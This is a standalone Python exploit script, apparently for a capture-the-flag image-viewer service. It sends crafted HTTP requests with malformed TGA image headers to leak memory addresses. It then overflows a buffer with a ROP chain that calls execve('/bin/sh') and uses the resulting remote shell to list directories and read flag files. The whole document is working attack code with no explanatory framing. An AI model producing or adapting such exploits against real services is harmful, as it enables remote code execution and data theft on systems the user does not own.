#!/usr/bin/env python3
# compact single-file exploit for the ctfcup image-viewer service
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "instances.ctfcup.online"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
TOKEN = sys.argv[3] if len(sys.argv) > 3 else None

W = H = 4
S = W * H * 3                      # X-Preview-Size -> 0x40 chunks
BLEN = 18 + 1 + 384                # tga header + chunk + 128 raw pixels
PREFIX = b""
HALF = True
LVT, LRET, PRDI, PRSI, PRAX, SYSC = 0x206db8, 0xcf7b1, 0x1cca4, 0x239af, 0x3b4aa, 0x155ed5


def rbody(gamma, payload):
    p = struct.pack("<BBBHHBHHHHBB", 0, 0, 10, 0, 0, 0, 0, 0, W, H, 24, 0) + payload
    p += b"\x00" * (BLEN - len(p))
    p = p[:BLEN]
    return ("POST /process HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n"
            "X-Filter: warm\r\nX-Preview-Size: %d\r\nX-Preview-Offset: 0\r\n"
            "X-Preview-Length: 1024\r\nX-Preview-Depth: 2000000000\r\n"
            "X-Scale: 1\r\nX-Gamma: %s\r\n\r\n" % (BLEN, S, gamma)).encode() + p


def xch(head, timeout=6.0, half=None, read_all=True):
    if half is None:
        half = HALF
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(PREFIX + head)
    if half:
        try:
            s.shutdown(socket.SHUT_WR)
        except OSError:
            pass
    out = b""
    while read_all:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        out += d
    return s, out


def detect():
    global PREFIX, HALF
    cands = [b""] + ([TOKEN.encode() + b"\n", TOKEN.encode() + b"\r\n"] if TOKEN else [])
    for half in (False, True):
        for pre in cands:
            PREFIX, HALF = pre, half
            try:
                s, out = xch(rbody("0", bytes([127 + 16]) + b"\x11\x22\x33"), timeout=5.0)
                s.close()
            except OSError as e:
                print("    prefix=%-3s half=%d -> %s" % (len(pre), half, e))
                continue
            print("    prefix=%-3s half=%d -> %d B %r" % (len(pre), half, len(out), out[:60]))
            if b"HTTP/" in out:
                return True
    PREFIX, HALF = b"", True
    return False


def leak():
    s, out = xch(rbody("0", bytes([127 + 16]) + b"\x11\x22\x33"), timeout=10.0, half=False)
    s.close()
    head, _, d = out.partition(b"\r\n\r\n")
    if len(d) < 0x100:
        raise SystemExit("no preview data: %r" % out[:120])
    for o in range(0, len(d) - 0x20, 8):
        vt = struct.unpack_from("<Q", d, o)[0]
        if vt < 0x1000:
            continue
        pie = vt - LVT
        if pie % 0x1000 == 0 and 0x40000000 <= pie < 0x800000000000:
            view, temp = struct.unpack_from("<QQ", d, o + 8)
            if view and temp and 0 < temp - view < 0x1000:
                return pie, view, view + o, temp


def main():
    print("[*] %s:%d" % (HOST, PORT))
    if not detect():
        raise SystemExit("[!] no HTTP answer at all -> instance down / token needed")
    pie, view, F, temp = leak()
    print("[+] pie=%#x view=%#x temp=%#x filter=%#x" % (pie, view, temp, F))
    d = F - temp
    if not 0x40 <= d <= 0x100:
        raise SystemExit("bad layout delta=%#x" % d)
    b = bytearray(b"\x90" * 384)
    def put(o, v): struct.pack_into("<Q", b, o, v)
    put(d + 0x00, F + 0x100); put(d + 0x08, pie + PRDI); put(d + 0x10, F + 0x120)
    put(d + 0x18, pie + PRSI); put(d + 0x20, 0);            put(d + 0x28, pie + PRAX)
    put(d + 0x30, 59);         put(d + 0x38, pie + SYSC);   put(d + 0x110, pie + LRET)
    b[d + 0x120:d + 0x128] = b"/bin/sh\x00"
    s, _ = xch(rbody("0", bytes([127]) + bytes(b)), half=False, read_all=False)
    print("[+] shell:")
    time.sleep(0.4)
    s.sendall(b"echo ---PWNED---; id; ls / /app /home 2>/dev/null; cat /flag /flag.txt /app/flag* /home/*/flag* 2>/dev/null\n")
    time.sleep(1.5); s.settimeout(2.5)
    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    print(out.decode("latin1", "replace"))


main()
